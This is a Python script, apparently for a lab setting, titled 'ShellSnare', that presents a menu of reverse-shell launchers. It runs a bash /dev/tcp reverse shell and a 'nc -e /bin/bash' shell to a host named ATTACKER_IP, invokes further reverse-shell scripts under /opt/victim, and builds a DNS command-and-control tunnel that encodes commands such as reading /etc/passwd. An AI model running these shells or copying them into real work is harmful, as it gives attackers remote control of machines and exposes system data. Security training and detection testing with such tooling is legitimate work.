import os
import sys
import socket
import time

ATTACKER_IP = "shellsnare-attacker"
PORT = "4444"

BANNER = """
╔═══════════════════════════════════════════╗
║  🪤  ShellSnare — Reverse Shell Launcher  ║
╠═══════════════════════════════════════════╣
║  1. Bash TCP          [Easy]              ║
║  2. Netcat            [Easy]              ║
║  3. Python Socket     [Medium]            ║
║  4. PHP fsockopen     [Medium]            ║
║  5. Socat SSL/TLS     [Hard]              ║
║  6. DNS C2 Tunnel     [Hard]              ║
║  7. HTTP Shell Beacon [Hard]              ║
║  0. Exit                                  ║
╚═══════════════════════════════════════════╝
"""

def print_menu():
    print(BANNER)

def launch_bash():
    print(f"[*] Launching Bash TCP shell → {ATTACKER_IP}:{PORT}")
    payload = f"bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1'"
    os.system(payload)

def launch_netcat():
    print(f"[*] Launching Netcat shell → {ATTACKER_IP}:{PORT}")
    os.system(f"nc -e /bin/bash {ATTACKER_IP} {PORT}")

def launch_python():
    print(f"[*] Launching Python socket shell → {ATTACKER_IP}:9001")
    os.system("python3 /opt/victim/scripts/python_reverse.py")

def launch_php():
    print(f"[*] Launching PHP fsockopen shell → {ATTACKER_IP}:5555")
    os.system("bash /opt/victim/scripts/php_reverse.sh")

def launch_socat():
    print(f"[*] Launching Socat SSL/TLS shell → {ATTACKER_IP}:4444")
    os.system("bash /opt/victim/scripts/ssl_reverse.sh")

def launch_dns_tunnel():
    print(f"[*] Launching DNS C2 tunnel → {ATTACKER_IP}:53")
    commands = ["whoami", "pwd", "uname -a", "cat /etc/passwd | head -n 2", "exit"]
    for cmd in commands:
        print(f"[*] DNS query: '{cmd}'")
        hex_cmd = cmd.encode().hex()
        labels = [hex_cmd[i:i+63] for i in range(0, len(hex_cmd), 63)]
        qname = b''
        for label in labels:
            qname += bytes([len(label)]) + label.encode()
        qname += b'\x06tunnel\x05local\x00'
        header = b'\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        qtype_qclass = b'\x00\x10\x00\x01'
        query = header + qname + qtype_qclass
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2.0)
            sock.sendto(query, (ATTACKER_IP, 53))
            response, _ = sock.recvfrom(512)
            print(f"[+] DNS response received (len={len(response)})")
        except Exception as e:
            print(f"[!] DNS transaction failed: {e}")
        time.sleep(1.5)

def launch_http_shell():
    print(f"[*] Launching HTTP shell beacon → {ATTACKER_IP}:8080")
    os.system("bash /opt/victim/scripts/http_reverse.sh")

if __name__ == "__main__":
    while True:
        print_menu()
        try:
            choice = input("Select shell type: ").strip()
            if choice == "1":
                launch_bash()
            elif choice == "2":
                launch_netcat()
            elif choice == "3":
                launch_python()
            elif choice == "4":
                launch_php()
            elif choice == "5":
                launch_socat()
            elif choice == "6":
                launch_dns_tunnel()
            elif choice == "7":
                launch_http_shell()
            elif choice == "0":
                print("Exiting...")
                sys.exit(0)
            else:
                print("[!] Invalid choice. Try again.")
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(0)
